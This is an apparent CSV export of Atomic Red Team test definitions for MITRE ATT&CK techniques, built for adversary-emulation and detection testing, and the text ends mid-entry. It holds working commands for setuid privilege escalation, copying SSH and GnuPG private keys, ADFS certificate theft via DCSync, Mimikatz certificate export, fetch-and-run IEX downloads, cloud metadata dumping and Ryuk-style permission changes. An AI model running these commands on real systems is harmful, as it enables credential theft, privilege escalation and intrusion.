",,,"input_arguments.file_to_setuid.description: Path of file to set SetGID flag

input_arguments.file_to_setuid.type: path

input_arguments.file_to_setuid.default: /tmp/evilBinary

"
T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Set a SetGID flag on file (freebsd),1f73af33-62a8-4bf1-bd10-3bea931f2c0d,"This test sets the SetGID flag on a file in FreeBSD.
",linux,,,"touch #{file_to_setuid}
chown root #{file_to_setuid}
chmod g+xs #{file_to_setuid}
",sh,True,,"rm #{file_to_setuid}
",,,"input_arguments.file_to_setuid.description: Path of file to set SetGID flag

input_arguments.file_to_setuid.type: path

input_arguments.file_to_setuid.default: /tmp/evilBinary

"
T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Make and modify capabilities of a binary,db53959c-207d-4000-9e7a-cd8eb417e072,"Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.
The binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.
Without being owned by root, the binary can set the UID to 0.
",linux,,,"cp #{payload} /tmp/cap.c
make /tmp/cap
sudo setcap cap_setuid=ep /tmp/cap
/tmp/cap
",sh,True,,"rm /tmp/cap
rm /tmp/cap.c
",,,"input_arguments.payload.description: cap.c payload

input_arguments.payload.type: path

input_arguments.payload.default: PathToAtomicsFolder/T1548.001/src/cap.c

"
T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Provide the SetUID capability to a file,1ac3272f-9bcf-443a-9888-4b1d3de785c1,"This test gives a file the capability to set UID without using flags.
",linux,,,"touch #{file_to_setcap}
sudo setcap cap_setuid=ep #{file_to_setcap}
",sh,True,,"rm #{file_to_setcap}
",,,"input_arguments.file_to_setcap.description: Path of file to provide the SetUID capability

input_arguments.file_to_setcap.type: path

input_arguments.file_to_setcap.default: /tmp/evilBinary

"
T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Do reconnaissance for files that have the setuid bit set,8e36da01-cd29-45fd-be72-8a0fcaad4481,"This test simulates a command that can be run to enumerate files that have the setuid bit set
",linux,,,"find /usr/bin -perm -4000
",sh,,,,,,
T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Do reconnaissance for files that have the setgid bit set,3fb46e17-f337-4c14-9f9a-a471946533e2,"This test simulates a command that can be run to enumerate files that have the setgid bit set
",linux,,,"find /usr/bin -perm -2000
",sh,,,,,,
T1552.004,Unsecured Credentials: Private Keys,Private Keys,520ce462-7ca7-441e-b5a5-f8347f632696,"Find private keys on the Windows file system.
File extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc
",windows,,,"dir c:\ /b /s .key | findstr /e .key
",command_prompt,True,,,,,
T1552.004,Unsecured Credentials: Private Keys,Discover Private SSH Keys,46959285-906d-40fa-9437-5a439accd878,"Discover private SSH keys on a FreeBSD, macOS or Linux system.
",linux,macos,,"find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}
exit 0
",sh,,,"rm #{output_file}
",,,"input_arguments.search_path.description: Path where to start searching from.

input_arguments.search_path.type: path

input_arguments.search_path.default: /

input_arguments.output_file.description: Output file containing locations of SSH key files

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/keyfile_locations.txt

"
T1552.004,Unsecured Credentials: Private Keys,Copy Private SSH Keys with CP,7c247dc7-5128-4643-907b-73a76d9135c3,"Copy private SSH keys on a Linux system to a staging folder using the `cp` command.
",linux,,,"mkdir #{output_folder}
find #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \;
exit 0
",sh,,,"rm -rf #{output_folder}
",,,"input_arguments.search_path.description: Path where to start searching from.

input_arguments.search_path.type: path

input_arguments.search_path.default: /

input_arguments.output_folder.description: Output folder containing copies of SSH private key files

input_arguments.output_folder.type: path

input_arguments.output_folder.default: /tmp/art-staging

"
T1552.004,Unsecured Credentials: Private Keys,Copy Private SSH Keys with CP (freebsd),12e4a260-a7fd-4ed8-bf18-1a28c1395775,"Copy private SSH keys on a FreeBSD system to a staging folder using the `cp` command.
",linux,,,"mkdir #{output_folder}
find #{search_path} -name id_rsa 2>/dev/null -exec gcp --parents {} #{output_folder} \;
",sh,,,"rm -rf #{output_folder}
",sh,"dependencies.0.description: Install GNU cp from coreutils package.

dependencies.0.prereq_command: if [ ! -x ""$(command -v gcp)"" ]; then exit 1; else exit 0; fi;

dependencies.0.get_prereq_command: (which pkg && pkg install -y coreutils)

","input_arguments.search_path.description: Path where to start searching from.

input_arguments.search_path.type: path

input_arguments.search_path.default: /

input_arguments.output_folder.description: Output folder containing copies of SSH private key files

input_arguments.output_folder.type: path

input_arguments.output_folder.default: /tmp/art-staging

"
T1552.004,Unsecured Credentials: Private Keys,Copy Private SSH Keys with rsync,864bb0b2-6bb5-489a-b43b-a77b3a16d68a,"Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.
",macos,linux,,"mkdir #{output_folder}
find #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \;
exit 0
",sh,,,"rm -rf #{output_folder}
",,,"input_arguments.search_path.description: Path where to start searching from.

input_arguments.search_path.type: path

input_arguments.search_path.default: /

input_arguments.output_folder.description: Output folder containing copies of SSH private key files

input_arguments.output_folder.type: path

input_arguments.output_folder.default: /tmp/art-staging

"
T1552.004,Unsecured Credentials: Private Keys,Copy Private SSH Keys with rsync (freebsd),922b1080-0b95-42b0-9585-b9a5ea0af044,"Copy private SSH keys on a FreeBSD system to a staging folder using the `rsync` command.
",linux,,,"mkdir #{output_folder}
find #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \;
",sh,,,"rm -rf #{output_folder}
",sh,"dependencies.0.description: Check if rsync is installed.

dependencies.0.prereq_command: if [ ! -x ""$(command -v rsync)"" ]; then exit 1; else exit 0; fi;

dependencies.0.get_prereq_command: (which pkg && pkg install -y rsync)

","input_arguments.search_path.description: Path where to start searching from.

input_arguments.search_path.type: path

input_arguments.search_path.default: /

input_arguments.output_folder.description: Output folder containing copies of SSH private key files

input_arguments.output_folder.type: path

input_arguments.output_folder.default: /tmp/art-staging

"
T1552.004,Unsecured Credentials: Private Keys,Copy the users GnuPG directory with rsync,2a5a0601-f5fb-4e2e-aa09-73282ae6afca,"Copy the users GnuPG (.gnupg) directory on a Mac or Linux system to a staging folder using the `rsync` command.
",macos,linux,,"mkdir #{output_folder}
find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \;
exit 0
",sh,,,"rm -rf #{output_folder}
",,,"input_arguments.search_path.description: Path where to start searching from

input_arguments.search_path.type: path

input_arguments.search_path.default: /

input_arguments.output_folder.description: Output folder containing a copy of the .gnupg directory

input_arguments.output_folder.type: path

input_arguments.output_folder.default: /tmp/GnuPG

"
T1552.004,Unsecured Credentials: Private Keys,Copy the users GnuPG directory with rsync (freebsd),b05ac39b-515f-48e9-88e9-2f141b5bcad0,"Copy the users GnuPG (.gnupg) directory on a FreeBSD system to a staging folder using the `rsync` command.
",linux,,,"mkdir #{output_folder}
find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \;
",sh,,,"rm -rf #{output_folder}
",sh,"dependencies.0.description: Check if rsync is installed.

dependencies.0.prereq_command: if [ ! -x ""$(command -v rsync)"" ]; then exit 1; else exit 0; fi;

dependencies.0.get_prereq_command: (which pkg && pkg install -y rsync)

","input_arguments.search_path.description: Path where to start searching from

input_arguments.search_path.type: path

input_arguments.search_path.default: /

input_arguments.output_folder.description: Output folder containing a copy of the .gnupg directory

input_arguments.output_folder.type: path

input_arguments.output_folder.default: /tmp/GnuPG

"
T1552.004,Unsecured Credentials: Private Keys,ADFS token signing and encryption certificates theft - Local,78e95057-d429-4e66-8f82-0f060c1ac96f,"Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.
Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
",windows,,,"Import-Module AADInternals -Force
Export-AADIntADFSCertificates
Get-ChildItem | Where-Object {$_ -like ""ADFS*""}
Write-Host ""`nCertificates retrieved successfully""
",powershell,,,"Remove-Item -Path "".\ADFS_encryption.pfx"" -ErrorAction Ignore
Remove-Item -Path "".\ADFS_signing.pfx"" -ErrorAction Ignore
",powershell,"dependencies.0.description: AADInternals module must be installed.

dependencies.0.prereq_command: if (Get-Module AADInternals) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name AADInternals -Force

",
T1552.004,Unsecured Credentials: Private Keys,ADFS token signing and encryption certificates theft - Remote,cab413d8-9e4a-4b8d-9b84-c985bd73a442,"Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.
Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
",windows,,,"Import-Module ActiveDirectory -Force 
Import-Module AADInternals -Force | Out-Null
#Get Configuration
$dcServerName = (Get-ADDomainController).HostName
$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq ""#{adfs_service_account_name}""
$PWord = ConvertTo-SecureString -String ""#{replication_password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord
# use DCSync to fetch the ADFS service account's NT hash
$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex
$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}
# Get certificates decryption key
$Configuration = [xml]$ADFSConfig
$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group
$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName
$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn
$base = ""LDAP://CN=$group,$container,$parent""
$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))
$ADSearch.Filter = '(name=CryptoPolicy)'
$ADSearch.PropertiesToLoad.Clear()
$ADSearch.PropertiesToLoad.Add(""displayName"") | Out-Null
$aduser = $ADSearch.FindOne()
$keyObjectGuid = $ADUser.Properties[""displayName""] 
$ADSearch.PropertiesToLoad.Clear()
$ADSearch.PropertiesToLoad.Add(""thumbnailphoto"") | Out-Null
$ADSearch.Filter=""(l=$keyObjectGuid)""
$aduser=$ADSearch.FindOne() 
$key=[byte[]]$aduser.Properties[""thumbnailphoto""][0] 
# Get encrypted certificates from configuration and decrypt them
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key
Get-ChildItem | Where-Object {$_ -like ""ADFS*""}
Write-Host ""`nCertificates retrieved successfully""
",powershell,,,"Remove-Item -Path "".\ADFS_encryption.pfx"" -ErrorAction Ignore
Remove-Item -Path "".\ADFS_signing.pfx"" -ErrorAction Ignore
",powershell,"dependencies.0.description: AADInternals and ActiveDirectory modules must be installed.

dependencies.0.prereq_command: if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}

dependencies.0.get_prereq_command: Install-Module -Name AADInternals -Force

","input_arguments.adfs_service_account_name.description: Name of the ADFS service account

input_arguments.adfs_service_account_name.type: string

input_arguments.adfs_service_account_name.default: adfs_svc

input_arguments.replication_user.description: Username with replication rights. It can be the Domain Admin running the script

input_arguments.replication_user.type: string

input_arguments.replication_user.default: Administrator

input_arguments.replication_password.description: Password of replication_username

input_arguments.replication_password.type: string

input_arguments.replication_password.default: ReallyStrongPassword

input_arguments.adfs_server_name.description: Name of an ADFS server

input_arguments.adfs_server_name.type: string

input_arguments.adfs_server_name.default: sts.contoso.com

"
T1552.004,Unsecured Credentials: Private Keys,CertUtil ExportPFX,336b25bf-4514-4684-8924-474974f28137,"The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.
Keys will look like - \SystemCertificates\CA\Certificates or \SystemCertificates\Root\Certificates
Reference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec
Reference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html
",windows,,,"IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
certutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}
",powershell,True,,"Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item 
",,,"input_arguments.output.description: file path to export to

input_arguments.output.type: path

input_arguments.output.default: c:\temp\atomic.pfx

input_arguments.password.description: password for cert

input_arguments.password.type: string

input_arguments.password.default: password

"
T1552.004,Unsecured Credentials: Private Keys,Export Root Certificate with Export-PFXCertificate,7617f689-bbd8-44bc-adcd-6f8968897848,"Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet.
Upon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.
",windows,,,"$mypwd = ConvertTo-SecureString -String ""AtomicRedTeam"" -Force -AsPlainText
$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
Set-Location Cert:\LocalMachine\My
Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath #{pfx_path} -Password $mypwd
",powershell,True,,"try {
$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
} catch { }
",,,"input_arguments.pfx_path.description: output path of the certificate

input_arguments.pfx_path.type: string

input_arguments.pfx_path.default: $env:Temp\atomicredteam.pfx

"
T1552.004,Unsecured Credentials: Private Keys,Export Root Certificate with Export-Certificate,78b274f8-acb0-428b-b1f7-7b0d0e73330a,"Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet.
Upon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.
",windows,,,"$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
Set-Location Cert:\LocalMachine\My
Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
",powershell,True,,"try {
   $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My -ErrorAction Ignore
   Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
   Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
}
catch { }
",,,"input_arguments.pfx_path.description: Path of the certificate

input_arguments.pfx_path.type: path

input_arguments.pfx_path.default: $env:Temp\AtomicRedTeam.cer

"
T1552.004,Unsecured Credentials: Private Keys,Export Certificates with Mimikatz,290df60e-4b5d-4a5e-b0c7-dc5348ea0c86,"The following Atomic test will utilize Mimikatz to extract the certificates from the local system My store. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.
A successful attempt will stdout the certificates and write multiple .pfx and .der files to disk.
",windows,,,"""#{mimikatz_exe}"" ""crypto::certificates /systemstore:local_machine /store:my /export""  exit
",command_prompt,True,,,powershell,"dependencies.0.description: Mimikatz must exist on disk at specified location (#{mimikatz_exe})

dependencies.0.prereq_command: if (Test-Path ""#{mimikatz_exe}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing) 
$releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases""
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") }
$basePath = Split-Path ""#{mimikatz_exe}"" | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath

","input_arguments.mimikatz_exe.description: Path of the Mimikatz binary

input_arguments.mimikatz_exe.type: string

input_arguments.mimikatz_exe.default: PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe

"
T1222.001,File and Directory Permissions Modification: Windows File and Directory Permissions Modification,Take ownership using takeown utility,98d34bb4-6e75-42ad-9c41-1dae7dc6a001,"Modifies the filesystem permissions of the specified file or folder to take ownership of the object. Upon execution, ""SUCCESS"" will
be displayed for the folder and each file inside of it.
",windows,,,"takeown.exe /f #{file_folder_to_own} /r
",command_prompt,,,,command_prompt,"dependencies.0.description: Test requrires a file to take ownership of to be located at (#{file_folder_to_own})

dependencies.0.prereq_command: IF EXIST #{file_folder_to_own} ( EXIT 0 ) ELSE ( EXIT 1 )

dependencies.0.get_prereq_command: mkdir #{file_folder_to_own}
echo T1222.001_takeown1 >> #{file_folder_to_own}\T1222.001_takeown1.txt
echo T1222.001_takeown2 >> #{file_folder_to_own}\T1222.001_takeown2.txt

","input_arguments.file_folder_to_own.description: Path of the file or folder for takeown to take ownership.

input_arguments.file_folder_to_own.type: path

input_arguments.file_folder_to_own.default: %temp%\T1222.001_takeown_folder

"
T1222.001,File and Directory Permissions Modification: Windows File and Directory Permissions Modification,cacls - Grant permission to specified user or group recursively,a8206bcc-f282-40a9-a389-05d9c0263485,"Modifies the filesystem permissions of the specified folder and contents to allow the specified user or group Full Control. If ""Access is denied""
is displayed it may be because the file or folder doesn't exit. Run the prereq command to create it. Upon successfull execution, ""Successfully processed 3 files""
will be displayed.
",windows,,,"icacls.exe #{file_or_folder} /grant #{user_or_group}:F
",command_prompt,,,,command_prompt,"dependencies.0.description: Test requrires a file to modify to be located at (#{file_or_folder})

dependencies.0.prereq_command: IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )

dependencies.0.get_prereq_command: mkdir #{file_or_folder}
echo T1222.001_cacls1 >> #{file_or_folder}\T1222.001_cacls1.txt
echo T1222.001_cacls2 >> #{file_or_folder}\T1222.001_cacls2.txt

","input_arguments.file_or_folder.description: Path of the file or folder to change permissions.

input_arguments.file_or_folder.type: path

input_arguments.file_or_folder.default: %temp%\T1222.001_cacls

input_arguments.user_or_group.description: User or group to allow full control

input_arguments.user_or_group.type: string

input_arguments.user_or_group.default: Everyone

"
T1222.001,File and Directory Permissions Modification: Windows File and Directory Permissions Modification,attrib - Remove read-only attribute,bec1e95c-83aa-492e-ab77-60c71bbd21b0,"Removes the read-only attribute from a file or folder using the attrib.exe command. Upon execution, no output will be displayed.
Open the file in File Explorer > Right Click - Prperties and observe that the Read Only checkbox is empty.
",windows,,,"attrib.exe -r #{file_or_folder}\*.* /s
",command_prompt,,,,command_prompt,"dependencies.0.description: Test requrires a file to modify to be located at (#{file_or_folder})

dependencies.0.prereq_command: IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )

dependencies.0.get_prereq_command: mkdir #{file_or_folder}
echo T1222.001_attrib1 >> #{file_or_folder}\T1222.001_attrib1.txt
echo T1222.001_attrib2 >> #{file_or_folder}\T1222.001_attrib2.txt
attrib.exe +r #{file_or_folder}\T1222.001_attrib1.txt
attrib.exe +r #{file_or_folder}\T1222.001_attrib2.txt

","input_arguments.file_or_folder.description: Path of the file or folder remove attribute.

input_arguments.file_or_folder.type: path

input_arguments.file_or_folder.default: %temp%\T1222.001_attrib

"
T1222.001,File and Directory Permissions Modification: Windows File and Directory Permissions Modification,attrib - hide file,32b979da-7b68-42c9-9a99-0e39900fc36c,"Attackers leverage an existing Windows binary, attrib.exe, to mark specific files or folder as hidden by using specific flags so that
the victim does not see the file.
",windows,,,"mkdir #{file_or_folder} >nul 2>&1
echo T1222.001_attrib1 >> #{file_or_folder}\T1222.001_attrib1.txt
echo T1222.001_attrib2 >> #{file_or_folder}\T1222.001_attrib2.txt
attrib.exe +h #{file_or_folder}\T1222.001_attrib1.txt
attrib.exe +h #{file_or_folder}\T1222.001_attrib2.txt
",command_prompt,,,"del /A:H #{file_or_folder}\T1222.001_attrib*.txt >nul 2>&1
",,,"input_arguments.file_or_folder.description: Path of the files to hide.

input_arguments.file_or_folder.type: path

input_arguments.file_or_folder.default: %temp%\T1222.001_attrib_2

"
T1222.001,File and Directory Permissions Modification: Windows File and Directory Permissions Modification,Grant Full Access to folder for Everyone - Ryuk Ransomware Style,ac7e6118-473d-41ec-9ac0-ef4f1d1ed2f6,"Invokes the command line similar to that used by Ryuk Ransomware to grant full access to the entire C:\ drive for Everyone.
**icacls ""C:\*"" /grant Everyone:F /T /C /Q**
However, for this atomic we set the permission on C:\Users\Public so it completes faster and doesn't irreversibly affect the host.
You can set your own path variable to ""C:\*"" if you prefer.
",windows,,,"icacls ""#{path}"" /grant Everyone:F /T /C /Q",command_prompt,True,,"icacls '#{path}' /restore #{file_path} /q >nul 2>&1
",command_prompt,"dependencies.0.description: Backup of original folder permissions should exist (for use in cleanup commands)

dependencies.0.prereq_command: IF EXIST #{file_path} ( EXIT 0 ) ELSE ( EXIT 1 )

dependencies.0.get_prereq_command: icacls #{path} /save #{file_path} /t /q >nul 2>&1

","input_arguments.path.description: Path of folder to recursively set permissions on

input_arguments.path.type: path

input_arguments.path.default: C:\Users\Public\*

input_arguments.file_path.description: Path of folder permission back

input_arguments.file_path.type: path

input_arguments.file_path.default: %temp%\T1222.001-folder-perms-backup.txt

"
T1552.005,Unsecured Credentials: Cloud Instance Metadata API,Azure - Search Azure AD User Attributes for Passwords,ae9b2e3e-efa1-4483-86e2-fae529ab9fb6,"This test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials. 
Upon successful execution, this test will scan all user attributes for any strings containing ""password"".
Those unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found. 
See: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md
",azure-ad,,,"import-module msonline
$Password = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Password
Connect-MsolService -Credential $Credential
$users = Get-MsolUser -All;
foreach($user in $users)
{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; 
foreach($prop in $props)
{if($user.$prop -like ""*password*"")
{(""[*]"" + $user.UserPrincipalName + ""["" + $prop + ""]"" + "" : "" + $user.$prop) | out-file -filepath $env:temp\T1552.005Test1.txt -append -force}}}
get-content -path $env:temp\T1552.005Test1.txt -erroraction silentlycontinue
",powershell,True,,"remove-item $env:temp\T1552.005Test1.txt -force -erroraction silentlycontinue
",powershell,"dependencies.0.description: The MSOnline module must be installed.

dependencies.0.prereq_command: if (get-command Get-MsolUser -erroraction silentlycontinue){exit 0} else {exit 1}

dependencies.0.get_prereq_command: install-module MSOnline

","input_arguments.username.description: Azure AD username

input_arguments.username.type: string

input_arguments.username.default: None

input_arguments.password.description: Azure AD password

input_arguments.password.type: string

input_arguments.password.default: T1082Az

"
T1552.005,Unsecured Credentials: Cloud Instance Metadata API,Azure - Dump Azure Instance Metadata from Virtual Machines,cc99e772-4e18-4f1f-b422-c5cdd1bfd7b7,"This test invokes a web request to the default Instance Metadata API of 169.254.169.254 in order to dump the data contained within it to a file. 
See: https://www.sans.org/blog/cloud-instance-metadata-services-imds-/
",iaas:azure,,,"Invoke-RestMethod -Headers @{""Metadata""=""true""} -Method GET -Uri ""http://169.254.169.254/metadata/instance?api-version=2021-02-01"" | ConvertTo-Json -Depth 64 > #{output_file}
",powershell,,,"remove-item #{output_file} -force -erroraction silentlycontinue
",,,"input_arguments.output_file.description: File to output metadata to

input_arguments.output_file.type: string

input_arguments.output_file.default: $env:temp\T1552.005Test2.txt

"
T1546.001,Event Triggered Execution: Change Default File Association,Change Default File Association,10a08978-2045-4d62-8c42-1957bbbea102,"Change Default File Association From cmd.exe of hta to notepad.

Upon successful execution, cmd.exe will change the file association of .hta to notepad.exe. 
",windows,,,"assoc #{extension_to_change}=#{target_extension_handler}
",command_prompt,True,,"assoc  #{extension_to_change}=#{original_extension_handler}
",,,"input_arguments.target_extension_handler.description: txtfile maps to notepad.exe

input_arguments.target_extension_handler.type: path

input_arguments.target_extension_handler.default: txtfile

input_arguments.extension_to_change.description: File Extension To Hijack

input_arguments.extension_to_change.type: string

input_arguments.extension_to_change.default: .hta

input_arguments.original_extension_handler.description: File Extension To Revert

input_arguments.original_extension_handler.type: string

input_arguments.original_extension_handler.default: htafile

"
T1090.003,Proxy: Multi-hop Proxy,Psiphon,14d55ca0-920e-4b44-8425-37eedd72b173,"Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you
with uncensored access to Internet.
This process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.
More information can be found about Psiphon using the following urls
http://s3.amazonaws.com/0ubz-2q11-gi9y/en.html
https://psiphon.ca/faq.html
",windows,,,"& ""PathToAtomicsFolder\T1090.003\src\Psiphon.bat""
",powershell,,,"$Proxy = Get-Content $env:Temp\proxy-backup.txt -ErrorAction Ignore
if($null -ne $Proxy) 
{Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -Name ""ProxyServer"" -Value $Proxy}
",powershell,"dependencies.0.description: The proxy settings backup file must exist on disk at $env:Temp\proxy-backup.txt

dependencies.0.prereq_command: if (Test-Path $env:Temp\proxy-backup.txt) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: if(-not (test-path $env:Temp\proxy-backup.txt)){
$Proxy = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -Name ""ProxyServer"" -ErrorAction Ignore).ProxyServer
Set-Content $env:Temp\proxy-backup.txt $Proxy}

dependencies.1.description: The Psiphon executable must exist in the Downloads folder

dependencies.1.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\psiphon3.exe"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
Invoke-WebRequest ""https://s3.amazonaws.com/0ubz-2q11-gi9y/psiphon3.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\psiphon3.exe"" 

dependencies.2.description: Batch file containing commands to run must be in src directory 

dependencies.2.prereq_command: if (Test-Path ""PathToAtomicsFolder\T1090.003\src\Psiphon.bat"") {exit 0} else {exit 1}

dependencies.2.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\T1090.003\src\"" -ErrorAction ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1090.003/src/Psiphon.bat"" -OutFile ""PathToAtomicsFolder\T1090.003\src\Psiphon.bat""

",
T1090.003,Proxy: Multi-hop Proxy,Tor Proxy Usage - Windows,7b9d85e5-c4ce-4434-8060-d3de83595e69,"This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.
Upon successful execution, the tor proxy will be launched, run for 60 seconds, and then exit. 
",windows,,,"invoke-expression 'cmd /c start powershell -Command {cmd /c ""#{TorExe}""}'
sleep -s 60
stop-process -name ""tor"" | out-null
",powershell,False,,,powershell,"dependencies.0.description: tor.exe must be installed on the machine 

dependencies.0.prereq_command: if (Test-Path ""#{TorExe}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://archive.torproject.org/tor-package-archive/torbrowser/11.0.6/tor-win32-0.4.6.9.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\tor.zip""
expand-archive -LiteralPath ""PathToAtomicsFolder\..\ExternalPayloads\tor.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\tor""

","input_arguments.TorExe.description: Location of tor.exe file.

input_arguments.TorExe.type: string

input_arguments.TorExe.default: PathToAtomicsFolder\..\ExternalPayloads\tor\Tor\tor.exe

"
T1090.003,Proxy: Multi-hop Proxy,Tor Proxy Usage - Debian/Ubuntu/FreeBSD,5ff9d047-6e9c-4357-b39b-5cf89d9b59c7,"This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.
Upon successful execution, the tor proxy service will be launched. 
",linux,,,"[ ""$(uname)"" = 'FreeBSD' ] && sysrc tor_enable=""YES"" && service tor start || sudo systemctl start tor
",sh,True,,"[ ""$(uname)"" = 'FreeBSD' ] && service tor stop && sysrc -x tor_enable || sudo systemctl stop tor
",sh,"dependencies.0.description: Tor must be installed on the machine 

dependencies.0.prereq_command: if [ -x ""$(command -v tor --version)"" ]; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: (which apt && sudo apt-get -y install tor) || (which pkg && pkg install -y tor)

",
T1090.003,Proxy: Multi-hop Proxy,Tor Proxy Usage - MacOS,12631354-fdbc-4164-92be-402527e748da,"This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.
Upon successful execution, the tor proxy service will be launched. 
